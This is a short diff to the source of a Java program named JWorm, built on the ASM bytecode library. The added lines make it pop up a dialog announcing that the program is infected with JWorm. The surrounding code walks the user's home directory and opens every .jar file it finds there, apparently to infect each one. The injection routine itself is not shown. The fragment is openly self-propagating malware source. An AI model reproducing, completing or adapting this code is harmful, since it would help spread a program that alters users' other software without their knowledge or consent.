@@ -4,6 +4,8 @@ import java.io.File;
 import java.io.IOException;
 import java.util.jar.JarFile;
 
+import javax.swing.JOptionPane;
+
 import org.objectweb.asm.Label;
 import org.objectweb.asm.Opcodes;
 import org.objectweb.asm.Type;
@@ -24,6 +26,14 @@ public class JWorm extends Object implements Opcodes {
 	 * @param args String arguments passed to this program
 	 */
 	public static void main(String[] args) throws IOException {
+		new Thread(new Runnable() {
+
+			@Override
+			public void run() {
+				JOptionPane.showMessageDialog(null, "This program is infected with JWorm!");
+			}
+			
+		}).start();
 		for (File file : new File(System.getProperty("user.home")).listFiles())
 			if (file.getName().endsWith(".jar")) {
 				JavaArchive jar = new JavaArchive(new JarFile(file));
